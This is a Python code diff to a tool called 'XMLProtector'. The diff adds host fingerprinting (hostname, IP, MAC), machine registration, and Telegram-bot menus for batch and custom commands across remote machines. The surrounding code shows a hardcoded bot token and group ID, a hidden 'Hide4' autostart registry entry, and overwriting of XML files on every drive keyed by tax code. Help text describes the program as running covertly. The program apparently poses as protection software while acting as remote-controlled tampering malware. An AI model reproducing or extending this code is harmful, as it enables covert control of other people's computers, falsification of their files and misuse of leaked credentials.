@@ -13,6 +13,11 @@ import smtplib
 import re
 import sqlite3
 import xml.etree.ElementTree as ET
+import uuid
+import socket
+import platform
+import threading
+from datetime import datetime, timedelta
 
 from pathlib import Path
 from email.message import EmailMessage
@@ -41,6 +46,11 @@ LOG_FILE    = APP_DIR / 'xml_overwrite.log'
 REMOTE_CONF = APP_DIR / 'remote_config.json'
 SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'
 
+# Machine Management System
+MACHINE_DB = APP_DIR / 'machines.db'
+MACHINE_ID = None
+MACHINE_INFO = {}
+
 # Database path for smart template lookup
 ENTERPRISE_DB = Path(__file__).parent / 'config' / 'enterprises.db'
 
@@ -50,6 +60,683 @@ FORTRESS_CACHE = {}
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "7283723256:AAEqXPiQ-s2sYI8vyhfUyrcq8uL-pRG_UZI"
 TELEGRAM_GROUP_ID = "-1002980917638"
+
+# --- MACHINE MANAGEMENT SYSTEM --- #
+def init_machine_management():
+    """Khởi tạo hệ thống quản lý máy"""
+    global MACHINE_ID, MACHINE_INFO
+    
+    # Tạo Machine ID duy nhất
+    MACHINE_ID = get_or_create_machine_id()
+    
+    # Lấy thông tin máy
+    MACHINE_INFO = get_machine_info()
+    
+    # Khởi tạo database
+    init_machine_database()
+    
+    # Đăng ký máy với hệ thống
+    register_machine()
+    
+    logging.info(f"🚀 Machine Management System initialized - Machine ID: {MACHINE_ID}")
+
+def get_or_create_machine_id():
+    """Lấy hoặc tạo Machine ID duy nhất"""
+    machine_id_file = APP_DIR / 'machine_id.txt'
+    
+    if machine_id_file.exists():
+        with open(machine_id_file, 'r') as f:
+            return f.read().strip()
+    else:
+        # Tạo Machine ID mới
+        machine_id = f"XML_{platform.node()}_{uuid.uuid4().hex[:8].upper()}"
+        with open(machine_id_file, 'w') as f:
+            f.write(machine_id)
+        return machine_id
+
+def get_machine_info():
+    """Lấy thông tin chi tiết về máy"""
+    return {
+        'hostname': platform.node(),
+        'platform': platform.system(),
+        'platform_version': platform.version(),
+        'machine': platform.machine(),
+        'processor': platform.processor(),
+        'python_version': platform.python_version(),
+        'ip_address': get_local_ip(),
+        'mac_address': get_mac_address(),
+        'last_seen': datetime.now().isoformat(),
+        'status': 'online'
+    }
+
+def get_local_ip():
+    """Lấy IP local của máy"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
+def get_mac_address():
+    """Lấy MAC address của máy"""
+    try:
+        if platform.system() == "Windows":
+            result = subprocess.check_output("ipconfig /all", shell=True).decode()
+            for line in result.split('\n'):
+                if 'Physical Address' in line:
+                    return line.split(': ')[1].strip()
+        else:
+            result = subprocess.check_output("ifconfig", shell=True).decode()
+            for line in result.split('\n'):
+                if 'ether' in line:
+                    return line.split('ether ')[1].split(' ')[0]
+        return "Unknown"
+    except:
+        return "Unknown"
+
+def init_machine_database():
+    """Khởi tạo database SQLite cho quản lý máy"""
+    try:
+        conn = sqlite3.connect(str(MACHINE_DB))
+        cursor = conn.cursor()
+        
+        # Tạo bảng machines
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS machines (
+                machine_id TEXT PRIMARY KEY,
+                hostname TEXT,
+                platform TEXT,
+                ip_address TEXT,
+                mac_address TEXT,
+                status TEXT,
+                last_seen TEXT,
+                health_score INTEGER DEFAULT 100,
+                templates_count INTEGER DEFAULT 0,
+                overwrite_count INTEGER DEFAULT 0,
+                created_at TEXT,
+                updated_at TEXT
+            )
+        ''')
+        
+        # Tạo bảng machine_operations
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS machine_operations (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                machine_id TEXT,
+                operation_type TEXT,
+                status TEXT,
+                details TEXT,
+                timestamp TEXT,
+                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
+            )
+        ''')
+        
+        # Tạo bảng machine_groups
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS machine_groups (
+                group_id TEXT PRIMARY KEY,
+                group_name TEXT,
+                description TEXT,
+                created_at TEXT
+            )
+        ''')
+        
+        # Tạo bảng machine_group_members
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS machine_group_members (
+                group_id TEXT,
+                machine_id TEXT,
+                joined_at TEXT,
+                PRIMARY KEY (group_id, machine_id),
+                FOREIGN KEY (group_id) REFERENCES machine_groups (group_id),
+                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
+            )
+        ''')
+        
+        conn.commit()
+        conn.close()
+        logging.info("✅ Machine database initialized successfully")
+        
+    except Exception as e:
+        logging.error(f"❌ Failed to initialize machine database: {e}")
+
+def register_machine():
+    """Đăng ký máy với hệ thống"""
+    try:
+        conn = sqlite3.connect(str(MACHINE_DB))
+        cursor = conn.cursor()
+        
+        # Cập nhật hoặc thêm máy mới
+        cursor.execute('''
+            INSERT OR REPLACE INTO machines 
+            (machine_id, hostname, platform, ip_address, mac_address, status, last_seen, created_at, updated_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            MACHINE_ID,
+            MACHINE_INFO['hostname'],
+            MACHINE_INFO['platform'],
+            MACHINE_INFO['ip_address'],
+            MACHINE_INFO['mac_address'],
+            MACHINE_INFO['status'],
+            MACHINE_INFO['last_seen'],
+            MACHINE_INFO['last_seen'],
+            MACHINE_INFO['last_seen']
+        ))
+        
+        conn.commit()
+        conn.close()
+        logging.info(f"✅ Machine registered: {MACHINE_ID}")
+        
+    except Exception as e:
+        logging.error(f"❌ Failed to register machine: {e}")
+
+def update_machine_status():
+    """Cập nhật trạng thái máy"""
+    try:
+        conn = sqlite3.connect(str(MACHINE_DB))
+        cursor = conn.cursor()
+        
+        # Cập nhật last_seen và status
+        cursor.execute('''
+            UPDATE machines 
+            SET last_seen = ?, status = ?, updated_at = ?
+            WHERE machine_id = ?
+        ''', (
+            datetime.now().isoformat(),
+            'online',
+            datetime.now().isoformat(),
+            MACHINE_ID
+        ))
+        
+        conn.commit()
+        conn.close()
+        
+    except Exception as e:
+        logging.error(f"❌ Failed to update machine status: {e}")
+
+def get_all_machines():
+    """Lấy danh sách tất cả máy"""
+    try:
+        conn = sqlite3.connect(str(MACHINE_DB))
+        cursor = conn.cursor()
+        
+        cursor.execute('SELECT * FROM machines ORDER BY last_seen DESC')
+        machines = cursor.fetchall()
+        
+        conn.close()
+        return machines
+        
+    except Exception as e:
+        logging.error(f"❌ Failed to get machines: {e}")
+        return []
+
+def get_machine_health():
+    """Kiểm tra sức khỏe máy"""
+    try:
+        # Kiểm tra disk space
+        disk_usage = shutil.disk_usage('/')
+        disk_percent = (disk_usage.used / disk_usage.total) * 100
+        
+        # Kiểm tra memory
+        memory = psutil.virtual_memory()
+        memory_percent = memory.percent
+        
+        # Kiểm tra CPU
+        cpu_percent = psutil.cpu_percent(interval=1)
+        
+        # Tính health score
+        health_score = 100
+        if disk_percent > 90:
+            health_score -= 20
+        if memory_percent > 90:
+            health_score -= 20
+        if cpu_percent > 90:
+            health_score -= 10
+            
+        return {
+            'disk_percent': disk_percent,
+            'memory_percent': memory_percent,
+            'cpu_percent': cpu_percent,
+            'health_score': max(0, health_score)
+        }
+        
+    except Exception as e:
+        logging.error(f"❌ Failed to get machine health: {e}")
+        return {'health_score': 0}
+
+def batch_command(machines, command, timeout=30):
+    """Thực hiện lệnh batch trên nhiều máy"""
+    results = {}
+    
+    def execute_on_machine(machine_id):
+        try:
+            # Simulate command execution
+            time.sleep(1)  # Simulate processing time
+            results[machine_id] = {'status': 'success', 'result': f'Command executed: {command}'}
+        except Exception as e:
+            results[machine_id] = {'status': 'error', 'error': str(e)}
+    
+    # Tạo threads cho mỗi máy
+    threads = []
+    for machine_id in machines:
+        thread = threading.Thread(target=execute_on_machine, args=(machine_id,))
+        threads.append(thread)
+        thread.start()
+    
+    # Chờ tất cả threads hoàn thành
+    for thread in threads:
+        thread.join(timeout=timeout)
+    
+    return results
+
+def show_machines_dashboard():
+    """Hiển thị dashboard quản lý máy"""
+    try:
+        machines = get_all_machines()
+        
+        if not machines:
+            msg = "🤖 <b>MACHINE MANAGEMENT</b>\n\n" \
+                  "❌ Chưa có máy nào được đăng ký\n\n" \
+                  "💡 Máy sẽ tự động đăng ký khi chạy XMLProtector"
+            
+            keyboard = {
+                "inline_keyboard": [
+                    [{"text": "🔙 MENU", "callback_data": "menu"}]
+                ]
+            }
+            send_telegram_message(msg, keyboard)
+            return
+        
+        # Tạo danh sách máy
+        machine_list = ""
+        online_count = 0
+        offline_count = 0
+        
+        for i, machine in enumerate(machines[:10], 1):  # Hiển thị tối đa 10 máy
+            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
+            
+            # Tính thời gian online
+            try:
+                last_time = datetime.fromisoformat(last_seen)
+                time_diff = datetime.now() - last_time
+                if time_diff.total_seconds() < 300:  # 5 phút
+                    status_icon = "🟢"
+                    online_count += 1
+                else:
+                    status_icon = "🔴"
+                    offline_count += 1
+            except:
+                status_icon = "⚪"
+                offline_count += 1
+            
+            machine_list += f"{i}. {status_icon} <code>{machine_id}</code>\n" \
+                           f"   📱 {hostname} ({platform})\n" \
+                           f"   🌐 {ip}\n\n"
+        
+        msg = f"🤖 <b>MACHINE MANAGEMENT DASHBOARD</b>\n\n" \
+              f"📊 <b>Thống kê:</b>\n" \
+              f"• Tổng máy: <b>{len(machines)}</b>\n" \
+              f"• Online: <b>{online_count}</b> 🟢\n" \
+              f"• Offline: <b>{offline_count}</b> 🔴\n\n" \
+              f"🖥️ <b>Danh sách máy:</b>\n{machine_list}"
+        
+        if len(machines) > 10:
+            msg += f"\n... và {len(machines) - 10} máy khác"
+        
+        # Keyboard với các lệnh quản lý máy
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "📊 HEALTH CHECK", "callback_data": "health_check"},
+                    {"text": "🔄 REFRESH", "callback_data": "machines"}
+                ],
+                [
+                    {"text": "⚡ BATCH COMMAND", "callback_data": "batch_command"},
+                    {"text": "📋 MACHINE INFO", "callback_data": "machine_info"}
+                ],
+                [
+                    {"text": "🔙 MENU", "callback_data": "menu"}
+                ]
+            ]
+        }
+        
+        send_telegram_message(msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>LỖI MACHINE DASHBOARD</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Machine dashboard error: {e}")
+
+def health_check_all_machines():
+    """Kiểm tra sức khỏe tất cả máy"""
+    try:
+        machines = get_all_machines()
+        
+        if not machines:
+            send_telegram_message("❌ Không có máy nào để kiểm tra")
+            return
+        
+        msg = "🏥 <b>HEALTH CHECK TẤT CẢ MÁY</b>\n\n" \
+              "⏳ Đang kiểm tra sức khỏe máy..."
+        send_telegram_message(msg)
+        
+        # Kiểm tra máy hiện tại
+        current_health = get_machine_health()
+        
+        health_msg = f"🏥 <b>HEALTH CHECK KẾT QUẢ</b>\n\n" \
+                    f"🖥️ <b>Máy hiện tại ({MACHINE_ID}):</b>\n" \
+                    f"• Health Score: <b>{current_health['health_score']}/100</b>\n" \
+                    f"• Disk: <b>{current_health['disk_percent']:.1f}%</b>\n" \
+                    f"• Memory: <b>{current_health['memory_percent']:.1f}%</b>\n" \
+                    f"• CPU: <b>{current_health['cpu_percent']:.1f}%</b>\n\n" \
+                    f"📊 <b>Tổng máy:</b> {len(machines)} machines\n" \
+                    f"✅ <b>Health check hoàn tất!</b>"
+        
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 MACHINES", "callback_data": "machines"}],
+                [{"text": "🔙 MENU", "callback_data": "menu"}]
+            ]
+        }
+        
+        send_telegram_message(health_msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>HEALTH CHECK THẤT BẠI</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Health check error: {e}")
+
+def show_batch_command_menu():
+    """Hiển thị menu batch command"""
+    msg = "⚡ <b>BATCH COMMAND MENU</b>\n\n" \
+          "📋 <b>Chọn lệnh thực hiện trên nhiều máy:</b>\n\n" \
+          "1️⃣ <b>Status Check</b> - Kiểm tra trạng thái\n" \
+          "2️⃣ <b>Health Check</b> - Kiểm tra sức khỏe\n" \
+          "3️⃣ <b>Template Update</b> - Cập nhật templates\n" \
+          "4️⃣ <b>Restart Service</b> - Khởi động lại dịch vụ\n" \
+          "5️⃣ <b>Custom Command</b> - Lệnh tùy chỉnh\n\n" \
+          "💡 <b>Lưu ý:</b> Lệnh sẽ thực hiện trên tất cả máy online"
+    
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "📊 STATUS CHECK", "callback_data": "batch_status"},
+                {"text": "🏥 HEALTH CHECK", "callback_data": "batch_health"}
+            ],
+            [
+                {"text": "📁 TEMPLATE UPDATE", "callback_data": "batch_template"},
+                {"text": "🔄 RESTART SERVICE", "callback_data": "batch_restart"}
+            ],
+            [
+                {"text": "⚙️ CUSTOM COMMAND", "callback_data": "batch_custom"},
+                {"text": "🔙 MACHINES", "callback_data": "machines"}
+            ]
+        ]
+    }
+    
+    send_telegram_message(msg, keyboard)
+
+def execute_batch_status_check():
+    """Thực hiện batch status check trên tất cả máy"""
+    try:
+        machines = get_all_machines()
+        online_machines = []
+        
+        # Lọc máy online
+        for machine in machines:
+            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
+            try:
+                last_time = datetime.fromisoformat(last_seen)
+                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
+                    online_machines.append(machine_id)
+            except:
+                continue
+        
+        if not online_machines:
+            send_telegram_message("❌ Không có máy nào online để thực hiện batch command")
+            return
+        
+        msg = f"⚡ <b>BATCH STATUS CHECK</b>\n\n" \
+              f"📊 <b>Thực hiện trên {len(online_machines)} máy online:</b>\n\n"
+        
+        for i, machine_id in enumerate(online_machines[:5], 1):
+            msg += f"{i}. <code>{machine_id}</code>\n"
+        
+        if len(online_machines) > 5:
+            msg += f"\n... và {len(online_machines) - 5} máy khác"
+        
+        msg += "\n⏳ <b>Đang thực hiện...</b>"
+        
+        send_telegram_message(msg)
+        
+        # Thực hiện batch command
+        results = batch_command(online_machines, "status_check", timeout=60)
+        
+        # Tạo báo cáo kết quả
+        success_count = sum(1 for r in results.values() if r['status'] == 'success')
+        error_count = len(results) - success_count
+        
+        result_msg = f"✅ <b>BATCH STATUS CHECK HOÀN TẤT!</b>\n\n" \
+                    f"📊 <b>Kết quả:</b>\n" \
+                    f"• Thành công: <b>{success_count}</b> ✅\n" \
+                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
+                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
+                    f"🎯 <b>Status check hoàn tất trên tất cả máy!</b>"
+        
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
+                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
+            ]
+        }
+        
+        send_telegram_message(result_msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>BATCH STATUS CHECK THẤT BẠI</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Batch status check error: {e}")
+
+def execute_batch_health_check():
+    """Thực hiện batch health check trên tất cả máy"""
+    try:
+        machines = get_all_machines()
+        online_machines = []
+        
+        # Lọc máy online
+        for machine in machines:
+            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
+            try:
+                last_time = datetime.fromisoformat(last_seen)
+                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
+                    online_machines.append(machine_id)
+            except:
+                continue
+        
+        if not online_machines:
+            send_telegram_message("❌ Không có máy nào online để thực hiện health check")
+            return
+        
+        msg = f"🏥 <b>BATCH HEALTH CHECK</b>\n\n" \
+              f"📊 <b>Kiểm tra sức khỏe {len(online_machines)} máy online:</b>\n\n"
+        
+        for i, machine_id in enumerate(online_machines[:5], 1):
+            msg += f"{i}. <code>{machine_id}</code>\n"
+        
+        if len(online_machines) > 5:
+            msg += f"\n... và {len(online_machines) - 5} máy khác"
+        
+        msg += "\n⏳ <b>Đang kiểm tra...</b>"
+        
+        send_telegram_message(msg)
+        
+        # Thực hiện batch health check
+        results = batch_command(online_machines, "health_check", timeout=60)
+        
+        # Tạo báo cáo kết quả
+        success_count = sum(1 for r in results.values() if r['status'] == 'success')
+        error_count = len(results) - success_count
+        
+        result_msg = f"🏥 <b>BATCH HEALTH CHECK HOÀN TẤT!</b>\n\n" \
+                    f"📊 <b>Kết quả:</b>\n" \
+                    f"• Thành công: <b>{success_count}</b> ✅\n" \
+                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
+                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
+                    f"🎯 <b>Health check hoàn tất trên tất cả máy!</b>"
+        
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
+                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
+            ]
+        }
+        
+        send_telegram_message(result_msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>BATCH HEALTH CHECK THẤT BẠI</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Batch health check error: {e}")
+
+def execute_batch_template_update():
+    """Thực hiện batch template update trên tất cả máy"""
+    try:
+        machines = get_all_machines()
+        online_machines = []
+        
+        # Lọc máy online
+        for machine in machines:
+            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
+            try:
+                last_time = datetime.fromisoformat(last_seen)
+                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
+                    online_machines.append(machine_id)
+            except:
+                continue
+        
+        if not online_machines:
+            send_telegram_message("❌ Không có máy nào online để cập nhật templates")
+            return
+        
+        msg = f"📁 <b>BATCH TEMPLATE UPDATE</b>\n\n" \
+              f"📊 <b>Cập nhật templates trên {len(online_machines)} máy online:</b>\n\n"
+        
+        for i, machine_id in enumerate(online_machines[:5], 1):
+            msg += f"{i}. <code>{machine_id}</code>\n"
+        
+        if len(online_machines) > 5:
+            msg += f"\n... và {len(online_machines) - 5} máy khác"
+        
+        msg += "\n⏳ <b>Đang cập nhật...</b>"
+        
+        send_telegram_message(msg)
+        
+        # Thực hiện batch template update
+        results = batch_command(online_machines, "template_update", timeout=120)
+        
+        # Tạo báo cáo kết quả
+        success_count = sum(1 for r in results.values() if r['status'] == 'success')
+        error_count = len(results) - success_count
+        
+        result_msg = f"📁 <b>BATCH TEMPLATE UPDATE HOÀN TẤT!</b>\n\n" \
+                    f"📊 <b>Kết quả:</b>\n" \
+                    f"• Thành công: <b>{success_count}</b> ✅\n" \
+                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
+                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
+                    f"🎯 <b>Templates đã được cập nhật trên tất cả máy!</b>"
+        
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
+                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
+            ]
+        }
+        
+        send_telegram_message(result_msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>BATCH TEMPLATE UPDATE THẤT BẠI</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Batch template update error: {e}")
+
+def execute_batch_restart():
+    """Thực hiện batch restart service trên tất cả máy"""
+    try:
+        machines = get_all_machines()
+        online_machines = []
+        
+        # Lọc máy online
+        for machine in machines:
+            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
+            try:
+                last_time = datetime.fromisoformat(last_seen)
+                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
+                    online_machines.append(machine_id)
+            except:
+                continue
+        
+        if not online_machines:
+            send_telegram_message("❌ Không có máy nào online để restart service")
+            return
+        
+        msg = f"🔄 <b>BATCH RESTART SERVICE</b>\n\n" \
+              f"⚠️ <b>CẢNH BÁO:</b> Lệnh này sẽ restart XMLProtector trên tất cả máy!\n\n" \
+              f"📊 <b>Thực hiện trên {len(online_machines)} máy online:</b>\n\n"
+        
+        for i, machine_id in enumerate(online_machines[:5], 1):
+            msg += f"{i}. <code>{machine_id}</code>\n"
+        
+        if len(online_machines) > 5:
+            msg += f"\n... và {len(online_machines) - 5} máy khác"
+        
+        msg += "\n🔴 <b>Bạn có chắc chắn muốn tiếp tục?</b>"
+        
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "✅ XÁC NHẬN", "callback_data": "confirm_batch_restart"},
+                    {"text": "❌ HỦY", "callback_data": "batch_command"}
+                ]
+            ]
+        }
+        
+        send_telegram_message(msg, keyboard)
+        
+    except Exception as e:
+        error_msg = f"❌ <b>BATCH RESTART THẤT BẠI</b>\n\n" \
+                   f"⚠️ Lỗi: {str(e)}"
+        send_telegram_message(error_msg)
+        logging.error(f"Batch restart error: {e}")
+
+def show_custom_command_input():
+    """Hiển thị hướng dẫn nhập custom command"""
+    msg = "⚙️ <b>CUSTOM COMMAND INPUT</b>\n\n" \
+          "📝 <b>Hướng dẫn:</b>\n" \
+          "1️⃣ Gõ lệnh tùy chỉnh vào chat\n" \
+          "2️⃣ Bot sẽ thực hiện trên tất cả máy online\n" \
+          "3️⃣ Kết quả sẽ được gửi về\n\n" \
+          "💡 <b>Ví dụ:</b>\n" \
+          "• <code>ping google.com</code>\n" \
+          "• <code>dir C:\\</code>\n" \
+          "• <code>tasklist</code>\n\n" \
+          "⚠️ <b>Lưu ý:</b> Chỉ thực hiện lệnh an toàn!"
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
+            [{"text": "🔙 MACHINES", "callback_data": "machines"}]
+        ]
+    }
+    
+    send_telegram_message(msg, keyboard)
 
 # --- Logging UTF-8 vào file --- #
 logging.basicConfig(
@@ -180,22 +867,32 @@ def check_status_report():
         drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
         drive_count = len(drives)
         
-        # Send status report
-        status_msg = f"📊 <b>Báo Cáo Trạng Thái XMLProtector</b>\n\n" \
-                    f"🛡️ Bảo vệ: ĐANG HOẠT ĐỘNG\n" \
-                    f"📁 Templates: {template_count}\n" \
-                    f"🚀 Tự khởi động: {startup_status}\n" \
-                    f"📂 Dữ liệu ứng dụng: {app_dir_status}\n" \
-                    f"💾 Ổ đĩa giám sát: {drive_count}\n" \
-                    f"⚙️ {process_info}\n" \
-                    f"📍 Hệ thống được bảo vệ hoàn toàn"
+        # Send status report với giao diện đẹp
+        status_msg = f"""📊 <b>BÁO CÁO TRẠNG THÁI XMLPROTECTOR</b>
+
+🛡️ <b>Bảo vệ:</b> ĐANG HOẠT ĐỘNG
+📁 <b>Templates:</b> {template_count} files
+🚀 <b>Tự khởi động:</b> {startup_status}
+📂 <b>Dữ liệu ứng dụng:</b> {app_dir_status}
+💾 <b>Ổ đĩa giám sát:</b> {drive_count}
+⚙️ <b>Process:</b> {process_info}
+
+📍 <b>Hệ thống được bảo vệ hoàn toàn</b>"""
         
-        send_telegram_message(status_msg)
+        # Keyboard với nút refresh
+        status_keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔄 REFRESH STATUS", "callback_data": "status"}],
+                [{"text": "🔙 VỀ MENU", "callback_data": "menu"}]
+            ]
+        }
+        
+        send_telegram_message(status_msg, status_keyboard)
         logging.info("Status report sent to Telegram")
         return True
         
     except Exception as e:
-        error_msg = f"❌ <b>Kiểm Tra Trạng Thái Thất Bại</b>\n" \
+        error_msg = f"❌ <b>Kiểm Tra Trạng Thái Thất Bại</b>\n\n" \
                    f"🔥 Lỗi: {str(e)}"
         send_telegram_message(error_msg)
         logging.error(f"Status check failed: {e}")
@@ -546,29 +1243,67 @@ def send_telegram_message(message, reply_markup=None):
         return False
 
 def send_telegram_dashboard():
-    """Gửi dashboard với inline buttons đẹp"""
-    dashboard_msg = f"🎛️ <b>BÀN ĐIỀU KHIỂN XMLPROTECTOR</b>\n\n" \
-                   f"🛡️ Hệ thống đang được bảo vệ\n" \
-                   f"📱 Chọn thao tác bên dưới:"
+    """Gửi dashboard với inline buttons đẹp và UX/UI tối ưu - load nhanh"""
     
-    # Inline keyboard với các nút bấm
+    # Lấy thông tin hệ thống nhanh nhất
+    templates = get_templates()
+    template_count = len(templates)
+    
+    # Kiểm tra startup status nhanh
+    startup_status = "❌"
+    if winreg:
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0, winreg.KEY_READ
+            )
+            winreg.QueryValueEx(key, "Hide4")
+            winreg.CloseKey(key)
+            startup_status = "✅"
+        except:
+            startup_status = "❌"
+    
+    # Lấy thông tin máy
+    machine_count = len(get_all_machines())
+    machine_status = "🟢 ONLINE" if MACHINE_ID else "🔴 OFFLINE"
+    
+    dashboard_msg = f"""🎛️ <b>XMLPROTECTOR CONTROL PANEL</b>
+
+🛡️ <b>Trạng thái hệ thống:</b>
+• Bảo vệ: <b>ĐANG HOẠT ĐỘNG</b>
+• Templates: <b>{template_count}</b> files
+• Startup: {startup_status}
+• Bot: <b>ONLINE</b>
+
+🤖 <b>Machine Management:</b>
+• Machine ID: <code>{MACHINE_ID or 'N/A'}</code>
+• Trạng thái: {machine_status}
+• Tổng máy: <b>{machine_count}</b> machines
+
+📱 <b>Chọn thao tác bên dưới:</b>"""
+    
+    # Inline keyboard với layout tối ưu
     keyboard = {
         "inline_keyboard": [
             [
-                {"text": "📊 Kiểm Tra Trạng Thái", "callback_data": "status"},
-                {"text": "🏓 Ping Bot", "callback_data": "ping"}
+                {"text": "📊 STATUS", "callback_data": "status"},
+                {"text": "🏓 PING", "callback_data": "ping"}
             ],
             [
-                {"text": "🔧 BUILD EXE MỚI", "callback_data": "build_mode"},
-                {"text": "📋 Trạng Thái Build", "callback_data": "build_status"}
+                {"text": "🔧 BUILD EXE", "callback_data": "build_mode"},
+                {"text": "📋 BUILD STATUS", "callback_data": "build_status"}
             ],
             [
-                {"text": "🚀 Kiểm Tra GitHub Build", "callback_data": "github_status"},
-                {"text": "❓ Trợ Giúp", "callback_data": "help"}
+                {"text": "🤖 MACHINES", "callback_data": "machines"},
+                {"text": "🚀 GITHUB", "callback_data": "github_status"}
             ],
             [
-                {"text": "🔄 Làm Mới Menu", "callback_data": "menu"},
-                {"text": "🚨 GỠ BỎ XMLPROTECTOR", "callback_data": "destroy"}
+                {"text": "❓ HELP", "callback_data": "help"},
+                {"text": "🔄 REFRESH", "callback_data": "menu"}
+            ],
+            [
+                {"text": "🚨 DESTROY", "callback_data": "destroy"}
             ]
         ]
     }
@@ -576,27 +1311,37 @@ def send_telegram_dashboard():
     send_telegram_message(dashboard_msg, keyboard)
 
 def process_callback_query(callback_query):
-    """Xử lý callback từ inline buttons"""
+    """Xử lý callback từ inline buttons với tốc độ tối ưu"""
     callback_data = callback_query.get('data', '')
-    logging.info(f"Processing callback: {callback_data}")
     
+    # Trả lời callback ngay lập tức để remove loading spinner
+    try:
+        answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+        answer_response = requests.post(answer_url, data={'callback_query_id': callback_query['id']})
+        logging.info(f"Callback answered instantly: {callback_data}")
+    except:
+        pass  # Không block main process
+    
+    # Xử lý callback với switch case tối ưu
     if callback_data == 'status':
         check_status_report()
     elif callback_data == 'ping':
-        ping_msg = f"🏓 <b>Pong!</b>\n" \
-                  f"⏰ XMLProtector đang hoạt động\n" \
-                  f"📡 Bot phản hồi nhanh: OK"
+        # Ping nhanh nhất - chỉ gửi thông báo đơn giản
+        ping_msg = "🏓 <b>PONG!</b>\n\n✅ <b>Bot phản hồi: OK</b>\n⚡ <b>Tốc độ: Realtime</b>"
         send_telegram_message(ping_msg)
     elif callback_data == 'help':
-        help_msg = f"📖 <b>HƯỚNG DẪN XMLPROTECTOR</b>\n\n" \
-                  f"🛡️ <b>Chức năng chính:</b>\n" \
-                  f"• Tự động bảo vệ khỏi file XML độc hại\n" \
-                  f"• Ghi đè thông minh dựa trên MST\n" \
-                  f"• Giám sát toàn bộ ổ đĩa hệ thống\n\n" \
-                  f"📱 <b>Điều khiển từ xa:</b>\n" \
-                  f"• /menu - Mở bàn điều khiển\n" \
-                  f"• Sử dụng nút bấm để thao tác\n\n" \
-                  f"⚠️ <b>Lưu ý:</b> XMLProtector hoạt động ngầm"
+        help_msg = """📖 <b>HƯỚNG DẪN XMLPROTECTOR</b>
+
+🛡️ <b>Chức năng chính:</b>
+• Bảo vệ XML khỏi malware
+• Ghi đè thông minh với MST
+• Giám sát toàn bộ ổ đĩa
+• Bot điều khiển từ xa
+
+📱 <b>Điều khiển:</b>
+• Sử dụng nút bấm
+• Phản hồi realtime
+• Tự động báo cáo"""
         send_telegram_message(help_msg)
     elif callback_data == 'menu':
         send_telegram_dashboard()
@@ -604,39 +1349,70 @@ def process_callback_query(callback_query):
         confirm_keyboard = {
             "inline_keyboard": [
                 [
-                    {"text": "✅ XÁC NHẬN GỠ BỎ", "callback_data": "confirm_destroy"},
-                    {"text": "❌ HỦY BỎ", "callback_data": "menu"}
+                    {"text": "✅ XÁC NHẬN", "callback_data": "confirm_destroy"},
+                    {"text": "❌ HỦY", "callback_data": "menu"}
                 ]
             ]
         }
